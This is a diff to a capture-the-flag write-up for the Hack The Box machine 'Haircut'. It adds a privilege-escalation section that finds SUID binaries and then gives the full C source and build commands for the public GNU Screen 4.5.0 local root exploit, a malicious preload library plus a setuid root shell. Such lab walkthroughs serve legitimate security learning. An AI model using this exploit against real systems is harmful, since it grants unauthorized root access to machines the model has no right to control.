@@ -1,6 +1,6 @@
 # Recon
 
-As usual we start with a port scan on the target:
+As usual we start with a port scan against the target:
 ```
 sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.24 -T5
 ```
@@ -37,6 +37,49 @@ stty raw -echo; fg
 ```
 
 # Privilege Escalation
+We can search for interesting files with SUID set by running the following command:
+```
+find / -perm -4000 -exec ls -l {} \; 2>/dev/null 
+```
+We spot ```/usr/bin/screen-4.5.0``` which has an privilege escalation exploit available. But because we won't have permission to run ```gcc``` on our target we'll first prepare some things locally.
+
+[GNU Screen 4.5.0 - Local Privilege Escalation](https://www.exploit-db.com/exploits/41154)
+
+Create: libhax.c
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+```
+
+Create: rootshell.c
+```
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+```
+
+```
+gcc -fPIC -shared -ldl -o libhax.so libhax.c
+gcc -o rootshell rootshell.c 
+```
+This will return some errors but we can ignore them. The code refers to other locations than our attacking machine but after we transfer them to the host it'll work fine.
+
+Now that we have created the files we download them to our target. We change the references in ```ld.so.preload``` and finally run our rootshell.
+
+<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Haircut/assets/5.png">
 
 
 
